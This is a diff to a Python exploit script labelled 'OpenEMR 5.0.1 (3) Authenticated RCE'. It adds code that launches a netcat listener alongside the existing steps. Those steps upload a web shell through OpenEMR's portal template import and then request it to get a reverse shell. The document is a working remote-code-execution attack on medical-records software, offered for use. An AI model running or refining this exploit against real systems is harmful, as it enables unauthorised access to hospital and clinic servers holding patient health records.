@@ -5,9 +5,9 @@ import requests
 import sys
 import time
 from optparse import OptionParser
+import subprocess
 
-
-print('(m4ud) OpenEMR 5.0.1 (3) Authenticated RCE\r\n')
+print('\r\n(m4ud) OpenEMR 5.0.1 (3) Authenticated RCE\r\n')
 
 class ProFTPDExploit:
 	def __init__(self, options): 
@@ -26,8 +26,9 @@ class ProFTPDExploit:
 		print('[ * ] Getting Shell, check your NetCat listener!!! [ * ]')
 		r = sess.post("http://" + self.target +"/portal/import_template.php?site=default", data = payload)
 		time.sleep(1)
+		f = subprocess.Popen(["nc", "-lvnp", self.lport])
 		shell = sess.get("http://"+ self.target +"/portal/shelly.php")
-
+		f.communicate()
 
 def main():
 	parser = OptionParser()
@@ -40,3 +41,4 @@ def main():
 	exploit = ProFTPDExploit(options) 
 if __name__=="__main__": 
 	main()
+
